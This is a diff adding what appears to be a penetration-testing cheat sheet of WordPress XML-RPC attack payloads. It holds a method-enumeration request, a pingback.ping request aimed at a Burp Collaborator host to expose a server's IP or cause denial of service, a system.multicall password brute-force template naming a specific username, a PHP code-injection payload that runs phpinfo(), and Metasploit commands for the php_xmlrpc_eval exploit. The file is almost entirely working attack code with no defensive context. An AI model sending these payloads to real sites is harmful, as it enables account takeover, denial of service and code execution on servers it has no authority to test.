@@ -1,0 +1,50 @@
+<?xml version="1.0"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+DOS using xmlrpc/finding ip behind firewall
+<?xml version="1.0"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://burp_collaborator</string></value>
+</param><param><value><string>http://targetsite</string>
+</value></param></params>
+</methodCall>
+
+
+Bruteforce using xmlrpc
+<?xml version="1.0"?>
+<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
+<value><struct><member>
+<name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>
+<value><array><data><value><string>akbar200</string></value><value><string>###PASSWORD</string></value></data></array></value>
+</member></struct></value>
+<value><struct><member>
+<name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>
+<value><array><data><value><string>akbar200</string></value><value><string>###PASSWORD</string></value></data></array></value>
+</member></struct></value>
+
+</data></array></value></param></params></methodCall>
+
+PHP info using xmlrpc
+<?xml version="1.0"?>
+<methodCall>
+<methodName>test.method</methodName>
+<params>
+<param>
+<value><name>','')); phpinfo(); exit;/*</name></value>
+</param>
+</params>
+</methodCall> 
+
+msf > use exploit/unix/webapp/php_xmlrpc_eval
+msf exploit(php_xmlrpc_eval) > show targets
+    ...targets...
+msf exploit(php_xmlrpc_eval) > set TARGET < target-id >
+msf exploit(php_xmlrpc_eval) > show options
+    ...show and set options...
+msf exploit(php_xmlrpc_eval) > exploit
